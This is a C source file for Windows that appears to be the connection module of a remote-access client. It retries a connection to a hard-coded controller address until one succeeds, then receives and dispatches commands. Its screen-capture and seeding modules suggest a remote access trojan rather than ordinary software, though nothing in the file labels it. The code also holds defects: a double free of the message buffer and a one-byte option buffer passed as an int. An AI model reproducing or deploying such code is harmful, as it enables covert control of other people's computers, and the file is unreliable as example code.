#include <stdio.h>
#include <windows.h>
#include "types.h"
#include "client.h"
#include "SCL.h"
#include "net/dns.h"
#include "net/interface.h"
#include "net/error.h"
#include "cmd/commands.h"
#include "cmd/screen.h"

int client_connected = 0;
int client_timeout = 1000;
uint64 client_io_block = 0;
uint64 client_io_nonBlock = 1;

SOCKET client_Socket = INVALID_SOCKET;
SOCKADDR_IN client_SocketAddr;

void client_Prepare(void)
{
	WSADATA wsaData;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		exit(0);
	}

	client_SocketAddr.sin_addr.s_addr = net_Dns_GetIp(CLIENT_IP);
	client_SocketAddr.sin_family = AF_INET;
	client_SocketAddr.sin_port = htons(CLIENT_PORT);
}

void client_Disconnect(void)
{
	if(client_Socket != INVALID_SOCKET)
	{
		shutdown(client_Socket, SD_BOTH);
		closesocket(client_Socket);
		client_Socket = INVALID_SOCKET;
		client_connected = 0;
	}
}

void client_Connect(void)
{
	client_connected = 0;
	client_Socket = INVALID_SOCKET;
	client_Socket = socket(AF_INET, SOCK_STREAM, 0);

	char _val1[1] = { 1 };

	setsockopt(client_Socket, SOL_SOCKET, SO_REUSEADDR, _val1, sizeof(int));
	setsockopt(client_Socket, SOL_SOCKET, SO_KEEPALIVE, _val1, sizeof(int));	
	setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));	

	if(client_Socket == INVALID_SOCKET)
	{
		WSACleanup();

		exit(0);
	}

	screen_isUsingCompressor = 0;
	while(connect(client_Socket, (SOCKADDR*)&client_SocketAddr, sizeof(client_SocketAddr)) < 0){}

	ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
	client_connected = 1;
	SCL_ResetSeed();
}

void client_ConnectionHandle(void)
{
	int rv = 0;
	FD_SET fd;
	uint8 *rmsg;

	while(client_connected == 1)
	{
		FD_ZERO(&fd);
		FD_SET(client_Socket, &fd);

		if(select(0, &fd, NULL, NULL, NULL) < 0)
		{
			continue; //maybe ?
		}

		if(FD_ISSET(client_Socket, &fd))
		{
			rv = net_ReceiveData(&rmsg);

			if(rv == NET_LOST_CONNECTION)
			{
				client_Disconnect();
				free(rmsg);
				
				return;
			}

			if(rmsg[0] == 0x0) //on empty len commands and on checking connection
			{
				free(rmsg);

				continue;
			}

			ioctlsocket(client_Socket, FIONBIO, &client_io_block);
			setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));

			rv = commands_Translate(rmsg);
			free(rmsg);

			if(rv == NET_LOST_CONNECTION)
			{
				client_Disconnect();
				free(rmsg);
				
				return;
			}else if(rv == COMMANDS_SUCC){
				SCL_SeedUp();
			}

			ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
		}
	}
}